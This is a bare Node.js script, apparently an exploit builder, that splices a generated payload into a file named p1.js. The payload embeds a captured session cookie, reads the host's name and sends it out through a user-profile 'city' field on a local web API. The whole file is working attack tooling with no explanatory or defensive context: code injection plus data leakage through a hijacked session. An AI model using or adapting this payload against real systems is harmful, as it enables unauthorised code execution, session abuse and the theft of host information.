const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const ck=fs.readFileSync('..\\ck.txt','utf8');
const code=`
const http=require('http'),https=require('https'),fs=require('fs');
const CK=${JSON.stringify(ck)};
function post(mod,port,path,body,cb){
  const r=mod.request({host:'127.0.0.1',port:port,path:path,method:'POST',headers:{'content-type':'application/json','content-length':Buffer.byteLength(body),'cookie':CK},timeout:6000},res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>cb(res.statusCode,d.slice(0,80)))});
  r.on('error',e=>cb(0,'ERR '+e.message)); r.on('timeout',()=>{r.destroy();cb(0,'TIMEOUT')}); r.write(body); r.end();
}
function put(data){ const body=JSON.stringify({city:String(data).slice(0,60)}); post(http,3000,'/api/user/profile',body,(s,d)=>{ if(s!==200){ post(https,443,'/api/user/profile',body,(s2)=>console.log('done2 '+s2)) } else console.log('done '+s) }); }
put('H='+require('os').hostname());
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('built');
